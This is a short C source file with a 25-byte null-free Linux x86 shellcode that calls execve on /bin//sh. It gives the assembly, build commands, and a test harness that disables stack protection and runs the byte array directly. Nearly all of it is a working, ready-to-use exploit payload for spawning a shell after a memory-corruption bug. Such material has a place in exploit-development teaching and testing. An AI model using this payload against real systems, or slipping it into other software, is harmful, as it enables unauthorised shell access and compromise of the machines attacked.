/*
 * execve("/bin//sh",NULL,NULL); Null-free linux x86 shellcode
 * Length: 25 bytes
 * By rootabeta
 *
 * Compilation is nothing special if you want to compile from source:
 * nasm -f elf shellcode.asm
 * ld -o shellcode shellcode.o
 * objdump -d shellcode #And it's just cleanup from there ;)
 * The c program this is wrapped in can be compiled to test the shellcode with
 * gcc -o tester -fno-stack-protector -z execstack -no-pie -m32 tester.c
 *
 * Assembly:

Section .text
	global _start
_start:
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	push eax 

	push 0x68732f2f ;hs//
	push 0x6e69622f ;nib/
			;/bin//sh
	mov ebx, esp	

	mov al, 0xb	;0xb is the syscall number for execve on x86
	int 0x80	;initiate syscall, profit
*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";

int main()
{
	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
        ret();
}
